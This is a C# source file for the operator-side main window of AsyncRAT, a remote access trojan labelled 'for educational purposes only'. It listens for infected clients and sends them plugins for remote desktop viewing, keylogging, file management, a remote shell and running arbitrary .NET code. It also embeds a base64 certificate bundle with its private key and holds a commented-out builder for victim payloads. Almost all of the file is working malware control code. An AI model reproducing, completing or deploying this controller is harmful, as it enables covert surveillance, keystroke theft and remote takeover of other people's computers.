﻿using System;
using System.Windows.Forms;
using Server.MessagePack;
using Server.Connection;
using System.Threading.Tasks;
using Microsoft.VisualBasic;
using System.Linq;
using System.Threading;
using System.Drawing;
using System.IO;
using Server.Forms;
using Server.Algorithm;
using System.Diagnostics;
using Server.Handle_Packet;
using Server.Helper;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/* 
       │ Author       : NYAN CAT
       │ Name         : AsyncRAT  Simple RAT
       │ Contact Me   : https:github.com/NYAN-x-CAT

       This program Is distributed for educational purposes only.
*/

namespace Server
{

    public partial class Form1 : Form
    {
        private bool trans;
        //public cGeoMain cGeoMain = new cGeoMain();
        private ListViewColumnSorter lvwColumnSorter;

        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0;
        }


        #region Form Helper
        private Clients[] GetSelectedClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.SelectedItems.Count == 0) return;
                    foreach (ListViewItem itm in listView1.SelectedItems)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private Clients[] GetAllClients()
        {
            List<Clients> clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
            {
                lock (Settings.LockListviewClients)
                {
                    if (listView1.Items.Count == 0) return;
                    foreach (ListViewItem itm in listView1.Items)
                    {
                        clientsList.Add((Clients)itm.Tag);
                    }
                }
            }));
            return clientsList.ToArray();
        }

        private async void Connect()
        {
            try
            {
                await Task.Delay(1000);
                string[] ports = Properties.Settings.Default.Ports.Split(',');
                foreach (var port in ports)
                {
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        Listener listener = new Listener();
                        Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.ToString().Trim()));
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        #endregion

        #region Form Events
        private async void Form1_Load(object sender, EventArgs e)
        {

            ListviewDoubleBuffer.Enable(listView1);
            ListviewDoubleBuffer.Enable(listView2);

            try
            {
                foreach (string client in Properties.Settings.Default.txtBlocked.Split(','))
                {
                    if (!string.IsNullOrWhiteSpace(client))
                    {
                        Settings.Blocked.Add(client);
                    }
                }
            }
            catch { }

            lvwColumnSorter = new ListViewColumnSorter();
            this.listView1.ListViewItemSorter = lvwColumnSorter;
            this.Text = $"{Settings.Version}";

#if DEBUG
            Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String("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"));
            Listener listener = new Listener();
            Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
            thread.IsBackground = true;
            thread.Start(6606);
#else
            using (FormPorts portsFrm = new FormPorts())
            {
                portsFrm.ShowDialog();
            }
#endif
            await Methods.FadeIn(this, 5);
            trans = true;

            if (Properties.Settings.Default.Notification == true)
            {
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            else
            {
                toolStripStatusLabel2.ForeColor = Color.Black;
            }

            new Thread(() =>
            {
                Connect();
            }).Start();
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            if (trans)
                this.Opacity = 1.0;
        }

        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.95;
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            notifyIcon1.Dispose();
            Environment.Exit(0);
        }

        private void listView1_KeyDown(object sender, KeyEventArgs e)
        {
            if (listView1.Items.Count > 0)
                if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
                    foreach (ListViewItem x in listView1.Items)
                        x.Selected = true;
        }

        private void listView1_MouseMove(object sender, MouseEventArgs e)
        {
            if (listView1.Items.Count > 1)
            {
                ListViewHitTestInfo hitInfo = listView1.HitTest(e.Location);
                if (e.Button == MouseButtons.Left && (hitInfo.Item != null || hitInfo.SubItem != null))
                    listView1.Items[hitInfo.Item.Index].Selected = true;
            }
        }

        private void ListView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                {
                    lvwColumnSorter.Order = SortOrder.Descending;
                }
                else
                {
                    lvwColumnSorter.Order = SortOrder.Ascending;
                }
            }
            else
            {
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            this.listView1.Sort();
        }

        private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
        {
            if (Properties.Settings.Default.Notification == true)
            {
                Properties.Settings.Default.Notification = false;
                toolStripStatusLabel2.ForeColor = Color.Black;
            }
            else
            {
                Properties.Settings.Default.Notification = true;
                toolStripStatusLabel2.ForeColor = Color.Green;
            }
            Properties.Settings.Default.Save();
        }

        #endregion

        #region MainTimers
        private void ping_Tick(object sender, EventArgs e)
        {
            if (listView1.Items.Count > 0)
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = "ping";
                foreach (Clients client in GetAllClients())
                {
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                GC.Collect();
            }
        }

        private void UpdateUI_Tick(object sender, EventArgs e)
        {
            Text = $"{Settings.Version}";
            lock (Settings.LockListviewClients)
                toolStripStatusLabel1.Text = $"Online {listView1.Items.Count.ToString()}     Selected {listView1.SelectedItems.Count.ToString()}                    Sent {Methods.BytesToString(Settings.SentValue).ToString()}     Received {Methods.BytesToString(Settings.ReceivedValue).ToString()}                    CPU {(int)performanceCounter1.NextValue()}%     RAM {(int)performanceCounter2.NextValue()}%";
        }

        #endregion

        #region Monitoring
        private void RemoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                //DLL Plugin
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\RemoteDesktop.dll"));
                foreach (Clients client in GetSelectedClients())
                {
                    FormRemoteDesktop remoteDesktop = (FormRemoteDesktop)Application.OpenForms["RemoteDesktop:" + client.ID];
                    if (remoteDesktop == null)
                    {
                        remoteDesktop = new FormRemoteDesktop
                        {
                            Name = "RemoteDesktop:" + client.ID,
                            F = this,
                            Text = "RemoteDesktop:" + client.ID,
                            ParentClient = client,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID, "RemoteDesktop")
                        };
                        remoteDesktop.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\LimeLogger.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormKeylogger KL = (FormKeylogger)Application.OpenForms["keyLogger:" + client.ID];
                    if (KL == null)
                    {
                        KL = new FormKeylogger
                        {
                            Name = "keyLogger:" + client.ID,
                            Text = "keyLogger:" + client.ID,
                            F = this,
                        };
                        KL.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\FileManager.dll"));

                foreach (Clients client in GetSelectedClients())
                {
                    FormFileManager fileManager = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
                    if (fileManager == null)
                    {
                        fileManager = new FormFileManager
                        {
                            Name = "fileManager:" + client.ID,
                            Text = "fileManager:" + client.ID,
                            F = this,
                            FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", client.ID)
                        };
                        fileManager.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }
        #endregion

        #region Miscellaneous

        private void RemoteShellToolStripMenuItem1_Click_1(object sender, EventArgs e)
        {
            try
            {
                MsgPack packet = new MsgPack();
                packet.ForcePathObject("Packet").AsString = "shell";

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "plugin";
                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                foreach (Clients client in GetSelectedClients())
                {
                    FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
                    if (shell == null)
                    {
                        shell = new FormShell
                        {
                            Name = "shell:" + client.ID,
                            Text = "shell:" + client.ID,
                            F = this,
                        };
                        shell.Show();
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        private void ExecuteNETCodeToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                using (FormDotNetEditor dotNetEditor = new FormDotNetEditor())
                {
                    dotNetEditor.ShowDialog();
                }
            }

        }
        #endregion

        /*
        #region Builder
        private void bUILDERToolStripMenuItem_Click(object sender, EventArgs e)
        {
#if DEBUG
            MessageBox.Show("You can't build using a 'debug' version, Please use the 'release' version", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
            using (FormBuilder formBuilder = new FormBuilder())
            {
                formBuilder.ShowDialog();
            }
        }
        #endregion
        */

        private void CLEARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                lock (Settings.LockListviewLogs)
                {
                    listView2.Items.Clear();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

    }
}